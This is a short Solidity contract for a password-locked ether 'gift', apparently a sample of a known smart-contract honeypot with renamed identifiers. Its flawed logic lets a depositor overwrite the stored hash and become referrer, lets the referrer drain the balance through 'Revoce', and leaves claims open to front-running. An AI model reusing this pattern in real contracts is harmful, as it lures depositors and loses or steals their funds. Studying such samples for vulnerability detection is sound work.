pragma solidity ^0.4.19;

contract updated_years_gift
{
    string alert;

    bool passHasBeenCollection = false;

    address referrer;

    bytes32 public checksumPass;

    function() public payable{}

    function AcquireSignature(bytes pass) public constant returns (bytes32) {return sha3(pass);}

    function GroupPass(bytes32 checksum)
    public
    payable
    {
        if( (!passHasBeenCollection&&(msg.value > 1 ether)) || checksumPass==0x0 )
        {
            checksumPass = checksum;
            referrer = msg.sender;
        }
    }

    function CollectionNotification(string _message)
    public
    {
        if(msg.sender==referrer)
        {
            alert =_message;
        }
    }

    function ObtainGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(checksumPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return alert;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.sender==referrer)
        {
            referrer.transfer(this.balance);
            alert="";
        }
    }

    function PassHasBeenCollection(bytes32 checksum)
    public
    {
        if(msg.sender==referrer&&checksum==checksumPass)
        {
           passHasBeenCollection=true;
        }
    }
}